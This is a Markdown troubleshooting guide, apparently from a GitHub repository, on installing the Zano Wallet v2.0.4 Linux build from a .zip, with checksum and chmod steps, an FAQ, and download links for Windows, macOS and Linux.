<p align="center"><img src="https://raw.githubusercontent.com/zano-projects/Zano-Wallet/master/learn/assets/03-download.webp" alt="Zano Wallet - How to Install Zano Wallet on Linux" width="100%"></p>

<h1 align="center">How to Install Zano Wallet on Linux</h1>

<p align="center">
<a href="https://github.com/zano-projects"><img src="https://img.shields.io/badge/GitHub-zano--projects-7c5cff?style=for-the-badge&logo=github" alt="Zano Wallet on GitHub"></a>
<a href="https://github.com/zano-projects/Zano-Wallet/releases/tag/v2.0.4"><img src="https://img.shields.io/badge/Release-v2.0.4-1f2a6b?style=for-the-badge" alt="Zano Wallet v2.0.4 release"></a>
<a href="https://github.com/zano-projects/Zano-Wallet/tree/master/learn"><img src="https://img.shields.io/badge/Guides-Zano%20Wallet%20Learn-3b2a8f?style=for-the-badge" alt="Zano Wallet guides"></a>
</p>

---

**Short answer:** Unpack the Zano Wallet .zip into a folder in your home directory, make the launcher executable, and start it from there.

## You'll see this if

- You are on Ubuntu, Debian, Fedora or another desktop Linux
- Nothing happens when you double-click the file

## Why it happens

The Linux build ships as a .zip so it works across distributions, which means you choose the folder and set the run permission yourself.

## How to fix it

1. Download `zano-wallet-2.0.4.zip` from the release page.
2. Check it with `sha256sum zano-wallet-2.0.4.zip` against the release table.
3. Extract it, for example to `~/zano-wallet`.
4. Mark the launcher executable in your file manager or with `chmod +x`.
5. Run it and let the sync finish.

Related reading: [Zano Wallet Sync Stuck at 0% or Not Moving](./zano-wallet-sync-stuck.md) and the [Zano Wallet for Linux](https://github.com/zano-projects/Zano-Wallet/tree/master/learn).

## If that didn't work

If the app opens and closes, start it from a terminal to read the error; missing graphics libraries are the usual cause and your package manager can install them. You can also read [Zano Wallet Filling Up Your Drive: Free Space Safely](./zano-wallet-disk-space-full.md).

## Prevent it next time

Keep the folder outside temporary locations, and extract new versions into a fresh folder rather than over the old one. More guides: [about the Zano blockchain](https://github.com/zano-projects/Zano-Wallet/tree/master/learn).

## FAQ

**Is there a .deb or AppImage?**  
The current release is distributed as a .zip for Linux.

**Can I run it on a server without a screen?**  
The desktop wallet needs a graphical session.

---

## The fix in one step: install the latest Zano Wallet

The current release, **Zano Wallet v2.0.4**, includes the latest fixes. Download it from the [tagged release](https://github.com/zano-projects/Zano-Wallet/releases/tag/v2.0.4):

[![Download Zano Wallet for Windows](https://img.shields.io/badge/Download-Windows-0078D6?style=for-the-badge&logo=windows&logoColor=white)](https://github.com/zano-projects/Zano-Wallet/releases/download/v2.0.4/zano-wallet-2.0.4-installer.exe) [![Download Zano Wallet for macOS](https://img.shields.io/badge/Download-macOS-111111?style=for-the-badge&logo=apple&logoColor=white)](https://github.com/zano-projects/Zano-Wallet/releases/download/v2.0.4/zano-wallet-2.0.4.dmg) [![Download Zano Wallet for Linux](https://img.shields.io/badge/Download-Linux-E95420?style=for-the-badge&logo=linux&logoColor=white)](https://github.com/zano-projects/Zano-Wallet/releases/download/v2.0.4/zano-wallet-2.0.4.zip)

| Platform | File | Version |
|---|---|---|
| Windows | [zano-wallet-2.0.4-installer.exe](https://github.com/zano-projects/Zano-Wallet/releases/download/v2.0.4/zano-wallet-2.0.4-installer.exe) | v2.0.4 |
| macOS | [zano-wallet-2.0.4.dmg](https://github.com/zano-projects/Zano-Wallet/releases/download/v2.0.4/zano-wallet-2.0.4.dmg) | v2.0.4 |
| Linux | [zano-wallet-2.0.4.zip](https://github.com/zano-projects/Zano-Wallet/releases/download/v2.0.4/zano-wallet-2.0.4.zip) | v2.0.4 |

> [!TIP]
> Compare the SHA-256 with the table on the [release page](https://github.com/zano-projects/Zano-Wallet/releases/tag/v2.0.4) before running the installer.

## Related guides

| Guide | More |
|---|---|
| [Zano Wallet Sync Stuck at 0% or Not Moving](./zano-wallet-sync-stuck.md) | [Zano Wallet for Linux](https://github.com/zano-projects/Zano-Wallet/tree/master/learn) |
| [Zano Wallet Filling Up Your Drive: Free Space Safely](./zano-wallet-disk-space-full.md) | [about the Zano blockchain](https://github.com/zano-projects/Zano-Wallet/tree/master/learn) |
| [How to Update Zano Wallet to the Latest Version](./update-zano-wallet.md) | [Zano Wallet guides](https://github.com/zano-projects/Zano-Wallet/tree/master/learn) |

---

<p align="center"><a href="https://github.com/zano-projects">github.com/zano-projects</a> · <a href="https://github.com/zano-projects/Zano-Wallet/releases/tag/v2.0.4">Release v2.0.4</a> · <a href="https://github.com/zano-projects/Zano-Wallet/tree/master/learn">All guides</a></p>
